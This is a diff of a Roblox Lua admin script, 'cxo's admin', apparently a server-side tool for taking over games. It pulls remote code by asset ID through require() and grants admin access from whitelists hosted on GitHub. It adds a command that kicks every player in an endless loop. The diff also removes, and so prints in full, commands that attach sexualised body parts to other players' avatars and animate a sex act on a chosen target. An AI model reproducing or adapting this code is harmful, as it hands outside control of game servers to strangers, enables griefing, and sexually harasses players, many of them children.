@@ -34,7 +34,7 @@ if _G.cxosadminloaded == true then
 end
 _G.cxosadminloaded = true
 
-local restrictedmode = true -- removes all bad commands like "/bang, /j, /woman" (so the game dont get terminated)
+local restrictedmode = true
 
 if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
 	require(112354705578311).load() -- goog loader
@@ -61,6 +61,7 @@ end
 
 -- local cxoURL = "https://raw.githubusercontent.com/pcxo/whitelisted/main/users" (old)
 local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted" -- (new)
+local cxoURL2 = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted2"
 local cmds = {}
 local banned = {}
 local countrybanned = {}
@@ -68,7 +69,6 @@ local crashbanned = {}
 local countries = {["BD"] = "Bangladesh", ["BE"] = "Belgium", ["BF"] = "Burkina Faso", ["BG"] = "Bulgaria", ["BA"] = "Bosnia and Herzegovina", ["BB"] = "Barbados", ["WF"] = "Wallis and Futuna", ["BL"] = "Saint Barthelemy", ["BM"] = "Bermuda", ["BN"] = "Brunei", ["BO"] = "Bolivia", ["BH"] = "Bahrain", ["BI"] = "Burundi", ["BJ"] = "Benin", ["BT"] = "Bhutan", ["JM"] = "Jamaica", ["BV"] = "Bouvet Island", ["BW"] = "Botswana", ["WS"] = "Samoa", ["BQ"] = "Bonaire, Saint Eustatius and Saba ", ["BR"] = "Brazil", ["BS"] = "Bahamas", ["JE"] = "Jersey", ["BY"] = "Belarus", ["BZ"] = "Belize", ["RU"] = "Russia", ["RW"] = "Rwanda", ["RS"] = "Serbia", ["TL"] = "East Timor", ["RE"] = "Reunion", ["TM"] = "Turkmenistan", ["TJ"] = "Tajikistan", ["RO"] = "Romania", ["TK"] = "Tokelau", ["GW"] = "Guinea-Bissau", ["GU"] = "Guam", ["GT"] = "Guatemala", ["GS"] = "South Georgia and the South Sandwich Islands", ["GR"] = "Greece", ["GQ"] = "Equatorial Guinea", ["GP"] = "Guadeloupe", ["JP"] = "Japan", ["GY"] = "Guyana", ["GG"] = "Guernsey", ["GF"] = "French Guiana", ["GE"] = "Georgia", ["GD"] = "Grenada", ["GB"] = "United Kingdom", ["GA"] = "Gabon", ["SV"] = "El Salvador", ["GN"] = "Guinea", ["GM"] = "Gambia", ["GL"] = "Greenland", ["GI"] = "Gibraltar", ["GH"] = "Ghana", ["OM"] = "Oman", ["TN"] = "Tunisia", ["JO"] = "Jordan", ["HR"] = "Croatia", ["HT"] = "Haiti", ["HU"] = "Hungary", ["HK"] = "Hong Kong", ["HN"] = "Honduras", ["HM"] = "Heard Island and McDonald Islands", ["VE"] = "Venezuela", ["PR"] = "Puerto Rico", ["PS"] = "Palestinian Territory", ["PW"] = "Palau", ["PT"] = "Portugal", ["SJ"] = "Svalbard and Jan Mayen", ["PY"] = "Paraguay", ["IQ"] = "Iraq", ["PA"] = "Panama", ["PF"] = "French Polynesia", ["PG"] = "Papua New Guinea", ["PE"] = "Peru", ["PK"] = "Pakistan", ["PH"] = "Philippines", ["PN"] = "Pitcairn", ["PL"] = "Poland", ["PM"] = "Saint Pierre and Miquelon", ["ZM"] = "Zambia", ["EH"] = "Western Sahara", ["EE"] = "Estonia", ["EG"] = "Egypt", ["ZA"] = "South Africa", ["EC"] = "Ecuador", ["IT"] = "Italy", ["VN"] = "Vietnam", ["SB"] = "Solomon Islands", ["ET"] = "Ethiopia", ["SO"] = "Somalia", ["ZW"] = "Zimbabwe", ["SA"] = "Saudi Arabia", ["ES"] = "Spain", ["ER"] = "Eritrea", ["ME"] = "Montenegro", ["MD"] = "Moldova", ["MG"] = "Madagascar", ["MF"] = "Saint Martin", ["MA"] = "Morocco", ["MC"] = "Monaco", ["UZ"] = "Uzbekistan", ["MM"] = "Myanmar", ["ML"] = "Mali", ["MO"] = "Macao", ["MN"] = "Mongolia", ["MH"] = "Marshall Islands", ["MK"] = "Macedonia", ["MU"] = "Mauritius", ["MT"] = "Malta", ["MW"] = "Malawi", ["MV"] = "Maldives", ["MQ"] = "Martinique", ["MP"] = "Northern Mariana Islands", ["MS"] = "Montserrat", ["MR"] = "Mauritania", ["IM"] = "Isle of Man", ["UG"] = "Uganda", ["TZ"] = "Tanzania", ["MY"] = "Malaysia", ["MX"] = "Mexico", ["IL"] = "Israel", ["FR"] = "France", ["IO"] = "British Indian Ocean Territory", ["SH"] = "Saint Helena", ["FI"] = "Finland", ["FJ"] = "Fiji", ["FK"] = "Falkland Islands", ["FM"] = "Micronesia", ["FO"] = "Faroe Islands", ["NI"] = "Nicaragua", ["NL"] = "Netherlands", ["NO"] = "Norway", ["NA"] = "Namibia", ["VU"] = "Vanuatu", ["NC"] = "New Caledonia", ["NE"] = "Niger", ["NF"] = "Norfolk Island", ["NG"] = "Nigeria", ["NZ"] = "New Zealand", ["NP"] = "Nepal", ["NR"] = "Nauru", ["NU"] = "Niue", ["CK"] = "Cook Islands", ["XK"] = "Kosovo", ["CI"] = "Ivory Coast", ["CH"] = "Switzerland", ["CO"] = "Colombia", ["CN"] = "China", ["CM"] = "Cameroon", ["CL"] = "Chile", ["CC"] = "Cocos Islands", ["CA"] = "Canada", ["CG"] = "Republic of the Congo", ["CF"] = "Central African Republic", ["CD"] = "Democratic Republic of the Congo", ["CZ"] = "Czech Republic", ["CY"] = "Cyprus", ["CX"] = "Christmas Island", ["CR"] = "Costa Rica", ["CW"] = "Curacao", ["CV"] = "Cape Verde", ["CU"] = "Cuba", ["SZ"] = "Swaziland", ["SY"] = "Syria", ["SX"] = "Sint Maarten", ["KG"] = "Kyrgyzstan", ["KE"] = "Kenya", ["SS"] = "South Sudan", ["SR"] = "Suriname", ["KI"] = "Kiribati", ["KH"] = "Cambodia", ["KN"] = "Saint Kitts and Nevis", ["KM"] = "Comoros", ["ST"] = "Sao Tome and Principe", ["SK"] = "Slovakia", ["KR"] = "South Korea", ["SI"] = "Slovenia", ["KP"] = "North Korea", ["KW"] = "Kuwait", ["SN"] = "Senegal", ["SM"] = "San Marino", ["SL"] = "Sierra Leone", ["SC"] = "Seychelles", ["KZ"] = "Kazakhstan", ["KY"] = "Cayman Islands", ["SG"] = "Singapore", ["SE"] = "Sweden", ["SD"] = "Sudan", ["DO"] = "Dominican Republic", ["DM"] = "Dominica", ["DJ"] = "Djibouti", ["DK"] = "Denmark", ["VG"] = "British Virgin Islands", ["DE"] = "Germany", ["YE"] = "Yemen", ["DZ"] = "Algeria", ["US"] = "United States", ["UY"] = "Uruguay", ["YT"] = "Mayotte", ["UM"] = "United States Minor Outlying Islands", ["LB"] = "Lebanon", ["LC"] = "Saint Lucia", ["LA"] = "Laos", ["TV"] = "Tuvalu", ["TW"] = "Taiwan", ["TT"] = "Trinidad and Tobago", ["TR"] = "Turkey", ["LK"] = "Sri Lanka", ["LI"] = "Liechtenstein", ["LV"] = "Latvia", ["TO"] = "Tonga", ["LT"] = "Lithuania", ["LU"] = "Luxembourg", ["LR"] = "Liberia", ["LS"] = "Lesotho", ["TH"] = "Thailand", ["TF"] = "French Southern Territories", ["TG"] = "Togo", ["TD"] = "Chad", ["TC"] = "Turks and Caicos Islands", ["LY"] = "Libya", ["VA"] = "Vatican", ["VC"] = "Saint Vincent and the Grenadines", ["AE"] = "United Arab Emirates", ["AD"] = "Andorra", ["AG"] = "Antigua and Barbuda", ["AF"] = "Afghanistan", ["AI"] = "Anguilla", ["VI"] = "U.S. Virgin Islands", ["IS"] = "Iceland", ["IR"] = "Iran", ["AM"] = "Armenia", ["AL"] = "Albania", ["AO"] = "Angola", ["AQ"] = "Antarctica", ["AS"] = "American Samoa", ["AR"] = "Argentina", ["AU"] = "Australia", ["AT"] = "Austria", ["AW"] = "Aruba", ["IN"] = "India", ["AX"] = "Aland Islands", ["AZ"] = "Azerbaijan", ["IE"] = "Ireland", ["ID"] = "Indonesia", ["UA"] = "Ukraine", ["QA"] = "Qatar", ["MZ"] = "Mozambique"}
 local chats = {}
 local messages = {}
-local TempWhitelist = {}
 local AutoRespawn = {}
 local fpslooped = {}
 local googul = {}
@@ -176,33 +176,33 @@ repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("cx
 
 local BackupIDs = {
 	-- cxo
-	3222470105;
-	7306448629;
-	21517314;
-	35950257;
+	"3222470105";
+	"7306448629";
+	"21517314";
+	"35950257";
 	-- tech
-	1702851506;
+	"1702851506";
 	-- knocks
-	1551416114;
+	"1551416114";
 	-- kozy
-	1889958;
+	"1889958";
 	-- decryptionite
-	120983992;
-	1921860822;
-	366631664;
-	13425405;
+	"120983992";
+	"1921860822";
+	"366631664";
+	"13425405";
 	-- palamode
-	523322320;
+	"523322320";
 	-- freddie
-	1724769699;
+	"1724769699";
 }
 
-function GetWhitelist()
+function GetWhitelist(url)
 	local returnedUsers = {}
 
 	-- Check from GitHub (first priority)
 	local success, response = pcall(function()
-		return game:GetService("HttpService"):GetAsync(cxoURL)
+		return game:GetService("HttpService"):GetAsync(url)
 	end)
 
 	if success and response then
@@ -215,7 +215,8 @@ function GetWhitelist()
 	return returnedUsers
 end
 
-_G.Whitelist = GetWhitelist()
+_G.Whitelist = GetWhitelist(cxoURL)
+local TempWhitelist = GetWhitelist(cxoURL2)
 
 function p(a, me)
 	local ps = game.Players:GetPlayers()
@@ -3769,7 +3770,7 @@ addcmd({
 
 		if arguments[1] then
 			if arg == "n" then
-				arg = "140555145345310"
+				arg = "71085737999532"
 			elseif arg == "t" then
 				arg = "401117743"
 			elseif arg == "s" then
@@ -4148,6 +4149,42 @@ addcmd({
 					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's chat hax"):Clone().Parent = plr.PlayerGui
 				else
 					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's chat hax"):Clone().Parent = plr:WaitForChild("PlayerGui")
+				end
+			end
+
+		end
+	end
+})
+
+addcmd({
+	Name = "logs",
+	Aliases = {"cmdlogs", "adminlogs"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+
+			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's admin logs") then
+				if plr.PlayerGui then
+					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's admin logs"):Clone().Parent = plr.PlayerGui
+				else
+					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("ccxo's admin logs"):Clone().Parent = plr:WaitForChild("PlayerGui")
+				end
+				cxoLogger:add_listener(plr)
+				return
+			end
+
+			local success, err = pcall(function()
+				require(100506488790924).load("cxo's admin logs")
+			end)
+
+			if err then
+				notfi(sender, "cxo's admin", "admin logs failed to load")
+			else
+				if plr.PlayerGui then
+					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's admin logs"):Clone().Parent = plr.PlayerGui
+					cxoLogger:add_listener(plr)
+				else
+					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's admin logs"):Clone().Parent = plr:WaitForChild("PlayerGui")
+					cxoLogger:add_listener(plr)
 				end
 			end
 
@@ -4908,9 +4945,11 @@ addcmd({
 			repeat task.wait() until v and v.Character
 			v:Kick("[cxo's admin]: This server was closed because someone triggered a new server creation.")
 		end)
-		task.wait(7.5)
-		for i,v in pairs(game.Players:GetPlayers()) do
-			v:Kick("[cxo's admin]: Failed to teleport you to the restarted server, this may be due to the server being over the 8 player size limit. Please manually join the server")
+		task.wait(3.5)
+		while task.wait() do
+			for i,v in pairs(game.Players:GetPlayers()) do
+				v:Kick("[cxo's admin]: Failed to teleport you to the restarted server, this may be due to the server being over the 8 player size limit. Please manually join the server")
+			end
 		end
 	end
 })
@@ -5389,7 +5428,7 @@ addcmd({
 			if audio == "t" then
 				audio = "401117743"
 			elseif audio == "n" then
-				audio = "140555145345310"
+				audio = "71085737999532"
 				volume = 10
 			elseif audio == "s" then
 				audio = "7713890963"
@@ -5458,7 +5497,7 @@ addcmd({
 		for i, plr in ipairs(targets) do
 
 			if audio == "n" then
-				audio = "140555145345310"
+				audio = "71085737999532"
 			elseif audio == "t" then
 				audio = "401117743"
 				volume = 10
@@ -5866,338 +5905,6 @@ addcmd({
 		end
 
 		
-	end
-})
-
-addcmd({
-	Name = "man",
-	Aliases = {"pp", "peep"},
-	Function = function(sender, targets, arguments)
-		if not restrictcheck(sender) then
-			for i, plr in ipairs(targets) do
-				if plr.Character and plr.Character:FindFirstChild("Torso") then
-					local tip = Instance.new("Part", plr.Character)
-					local peep = Instance.new("Part", plr.Character)
-					local ball1 = Instance.new("Part", plr.Character)
-					local ball2 = Instance.new("Part", plr.Character)
-
-					local tipmesh = Instance.new("SpecialMesh", tip)
-					local peepmesh = Instance.new("CylinderMesh", peep)
-					local ball1mesh = Instance.new("SpecialMesh", ball1)
-					local ball2mesh = Instance.new("SpecialMesh", ball2)
-
-					local tipweld = Instance.new("WeldConstraint", plr.Character)
-					local peepweld = Instance.new("WeldConstraint", plr.Character)
-					local peepweld2 = Instance.new("WeldConstraint", peep)
-					local ball1weld = Instance.new("WeldConstraint", plr.Character)
-					local ball2weld = Instance.new("WeldConstraint", plr.Character)
-
-					tip.BrickColor = BrickColor.new("Pink")
-					tip.Size = Vector3.new(1, 1, 1)
-					tip.BottomSurface = "Smooth"
-					tip.TopSurface = "Smooth"
-					tip.CanCollide = false
-					tip.Locked = true
-					
-					peep.Color = plr.Character.Torso.Color
-					peep.Size = Vector3.new(0.4, 1.3, 0.4)
-					peep.BottomSurface = "Smooth"
-					peep.TopSurface = "Smooth"
-					peep.CanCollide = false
-					peep.Locked = true
-					
-					ball1.Color = plr.Character.Torso.Color
-					ball1.Size = Vector3.new(1, 1, 1)
-					ball1.BottomSurface = "Smooth"
-					ball1.TopSurface = "Smooth"
-					ball1.CanCollide = false
-					ball1.Locked = true
-					
-					ball2.Color = plr.Character.Torso.Color
-					ball2.Size = Vector3.new(1, 1, 1)
-					ball2.BottomSurface = "Smooth"
-					ball2.TopSurface = "Smooth"
-					ball2.CanCollide = false
-					ball2.Locked = true
-
-					tipmesh.MeshType = "Sphere"
-					tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)
-
-					ball1mesh.MeshType = "Sphere"
-					ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
-
-					ball2mesh.MeshType = "Sphere"
-					ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
-
-					peep.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
-					tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
-					ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
-					ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)
-
-					tipweld.Part0 = plr.Character.Torso
-					tipweld.Part1 = tip
-
-					peepweld.Part0 = plr.Character.Torso
-					peepweld.Part1 = peep
-
-					peepweld2.Part0 = peep
-					peepweld2.Part1 = tip
-
-					ball1weld.Part0 = plr.Character.Torso
-					ball1weld.Part1 = ball1
-
-					ball2weld.Part0 = plr.Character.Torso
-					ball2weld.Part1 = ball2
-
-				end
-			end
-		else
-			notfi(sender, "cxo's admin", "restricted mode is enabled, this command can't be used.")
-		end
-	end
-})
-
-addcmd({
-	Name = "woman",
-	Aliases = {"girl"},
-	Function = function(sender, targets, arguments) -- took iy SS code for this one
-		if not restrictcheck(sender) then
-			for i, plr in ipairs(targets) do
-				if plr.Character and plr.Character:FindFirstChild("Torso") then
-
-					local V1 = plr.Character:FindFirstChild("Torso")
-
-					function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
-						local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
-						if (zCoco) then
-							funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
-						else
-							funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
-						end
-						return funcw
-					end
-
-					local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = plr.Character.Torso.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
-					local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
-					fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
-					local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = plr.Character.Torso.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
-					local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
-					fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
-					local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
-					local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
-					fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
-					local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
-					local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
-					fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
-					local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = plr.Character.Torso.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
-					local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
-					fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
-					local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = plr.Character.Torso.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
-					local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
-					fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)
-
-				end
-			end
-		else
-			notfi(sender, "cxo's admin", "restricted mode is enabled, this command can't be used.")
-		end
-	end
-})
-
-addcmd({
-	Name = "bang",
-	Aliases = {},
-	Player = false,
-	Function = function(sender, targets, arguments) -- took iy SS code for this one
-		if not restrictcheck(sender) then
-			local arg, plr
-		
-			if arguments[2] then
-				arg = arguments[1]
-				plr = arguments[2]
-			elseif arguments[1] then
-				arg = sender.Name
-				plr = arguments[1]
-			else
-				notfi(sender, "cxo's admin", "You need to specify at least one player!")
-				return
-			end
-
-			if arg == "me" then
-				arg = sender.Name
-			end
-
-			local argt = p(arg, sender)
-			local argt2 = p(plr, sender)
-
-			if #argt2 <= 0 then
-				V1 = workspace:FindFirstChild(plr)
-				if V1 then
-					V1 = V1.Torso
-				else
-					notfi(sender, "cxo's admin", "Invalid user / model!")
-					return
-				end
-			else
-				V1 = argt2[1]
-
-				if V1.Character and V1.Character:FindFirstChild("Torso") and V1.Character:FindFirstChild("Humanoid") then
-					V1 = argt2[1].Character:FindFirstChild("Torso")
-				else
-					notfi(sender, "cxo's admin", V1.Name .." Doesn't have a Torso!")
-					return
-				end
-			end
-
-			if argt[1].Character and argt[1].Character:FindFirstChild("Torso") and argt[1].Character:FindFirstChild("HumanoidRootPart") then
-
-				local P1 = argt[1].Character:FindFirstChild("Torso")
-
-				if #argt2 <= 0 and workspace:FindFirstChild(plr) then
-					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
-					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart").Massless = true
-				else
-					V1.Parent:FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
-					V1.Parent:FindFirstChild("HumanoidRootPart").Massless = true
-				end
-
-				function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
-					local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
-					if (zCoco) then
-						funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
-					else
-						funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
-					end
-					return funcw
-				end
-
-				local WE = nil
-
-				V1.Parent:FindFirstChild("Humanoid").PlatformStand = true
-				P1['Left Shoulder']:Destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'
-				P1['Right Shoulder']:Destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'
-				V1['Left Shoulder']:Destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'
-				V1['Right Shoulder']:Destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'
-				V1['Left Hip']:Destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'
-				V1['Right Hip']:Destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'
-
-				local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = V1.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
-				local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
-				fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
-				local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = V1.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
-				local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
-				fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
-				local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
-				local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
-				fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
-				local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
-				local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
-				fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
-				local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = V1.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
-				local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
-				fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
-				local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = V1.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
-				local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
-				fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)
-
-				local tip = Instance.new("Part", argt[1].Character)
-				local peep = Instance.new("Part", argt[1].Character)
-				local ball1 = Instance.new("Part", argt[1].Character)
-				local ball2 = Instance.new("Part", argt[1].Character)
-
-				local tipmesh = Instance.new("SpecialMesh", tip)
-				local peepmesh = Instance.new("CylinderMesh", peep)
-				local ball1mesh = Instance.new("SpecialMesh", ball1)
-				local ball2mesh = Instance.new("SpecialMesh", ball2)
-
-				local tipweld = Instance.new("WeldConstraint", argt[1].Character)
-				local peepweld = Instance.new("WeldConstraint", argt[1].Character)
-				local peepweld2 = Instance.new("WeldConstraint", peep)
-				local ball1weld = Instance.new("WeldConstraint", argt[1].Character)
-				local ball2weld = Instance.new("WeldConstraint", argt[1].Character)
-
-				tip.BrickColor = BrickColor.new("Pink")
-				tip.Size = Vector3.new(1, 1, 1)
-				tip.BottomSurface = "Smooth"
-				tip.TopSurface = "Smooth"
-				tip.CanCollide = false
-				tip.Locked = true
-				
-				peep.Color = argt[1].Character.Torso.Color
-				peep.Size = Vector3.new(0.4, 1.3, 0.4)
-				peep.BottomSurface = "Smooth"
-				peep.TopSurface = "Smooth"
-				peep.CanCollide = false
-				peep.Locked = true
-				
-				ball1.Color = argt[1].Character.Torso.Color
-				ball1.Size = Vector3.new(1, 1, 1)
-				ball1.BottomSurface = "Smooth"
-				ball1.TopSurface = "Smooth"
-				ball1.CanCollide = false
-				ball1.Locked = true
-				
-				ball2.Color = argt[1].Character.Torso.Color
-				ball2.Size = Vector3.new(1, 1, 1)
-				ball2.BottomSurface = "Smooth"
-				ball2.TopSurface = "Smooth"
-				ball2.CanCollide = false
-				ball2.Locked = true
-
-				tipmesh.MeshType = "Sphere"
-				tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)
-
-				ball1mesh.MeshType = "Sphere"
-				ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
-
-				ball2mesh.MeshType = "Sphere"
-				ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
-
-				peep.CFrame = argt[1].Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
-				tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
-				ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
-				ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)
-
-				tipweld.Part0 = argt[1].Character.Torso
-				tipweld.Part1 = tip
-
-				peepweld.Part0 = argt[1].Character.Torso
-				peepweld.Part1 = peep
-
-				peepweld2.Part0 = peep
-				peepweld2.Part1 = tip
-
-				ball1weld.Part0 = argt[1].Character.Torso
-				ball1weld.Part1 = ball1
-
-				ball2weld.Part0 = argt[1].Character.Torso
-				ball2weld.Part1 = ball2
-
-				LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
-				LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
-				LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)
-
-				WE = fWeld('weldx', P1, P1, V1, true, 0, -1, -2, math.rad(-90), 0, 0)
-				local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
-
-				task.spawn(function() 
-					while task.wait() do
-						for i = 1, 6 do -- forwards
-							WE.C0 = WE.C0 * CFrame.new(0, 0.1, 0)
-							task.wait(0.030)
-						end
-
-						for i = 1, 6 do -- backwards
-							WE.C0 = WE.C0 * CFrame.new(0, -0.1, 0)
-							task.wait(0.030)
-						end
-						task.wait()
-					end
-				end)
-			end
-		else
-			notfi(sender, "cxo's admin", "restricted mode is enabled, this command can't be used.")
-		end
 	end
 })
 
@@ -7162,9 +6869,30 @@ addcmd({
 })
 
 addcmd({
+	Name = "halo",
+	Aliases = {"masterchief"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, fail = pcall(function()
+				require(5812973403).Halo(plr.Name)
+			end)
+
+			if fail then
+				notfi(sender, "cxo's admin", "Halo failed to load: ".. fail)
+			end
+		end
+	end
+})
+
+addcmd({
 	Name = "tools",
 	Aliases = {"gears"},
 	Function = function(sender, targets, arguments)
+
